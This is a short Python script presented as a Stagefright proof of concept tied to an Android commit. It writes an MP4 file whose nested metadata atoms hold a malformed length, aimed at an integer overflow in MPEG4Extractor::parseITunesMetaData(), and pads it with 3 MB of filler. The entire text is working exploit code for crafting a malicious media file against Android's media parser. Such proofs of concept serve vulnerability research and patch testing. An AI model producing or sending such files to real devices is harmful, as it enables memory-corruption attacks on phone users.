#!/usr/bin/python

"""
Stagefright PoC for https://android.googlesource.com/platform/frameworks/av/+/2b50b7aa7d16014ccf35db7a7b4b5e84f7b4027c
"""
from struct import pack

def create_box(atom_type, data):
    return pack("!I", len(data)+4+4) + atom_type + data


ftyp_atom = create_box("ftyp", "mp42\x00\x00\x00\x00mp42isom")


# Integer overflow in MPEG4Extractor::parseITunesMetaData() function
# moov.udta.meta.ilst.xxxx.data
data_atom = pack("!I", 1) + "data" + pack("!II", 1, 0xf)
anyx_atom = create_box("anyx", data_atom)
ilst_atom = create_box("ilst", anyx_atom)
meta_atom = create_box("meta", pack("!I", 0) + ilst_atom)
udta_atom = create_box("udta", meta_atom)
moov_atom = create_box("moov", udta_atom)

f = open('sf-itunes-poc.mp4', 'wb')
f.write(ftyp_atom + moov_atom)
f.write("A"*(3*1024*1024))
f.close()
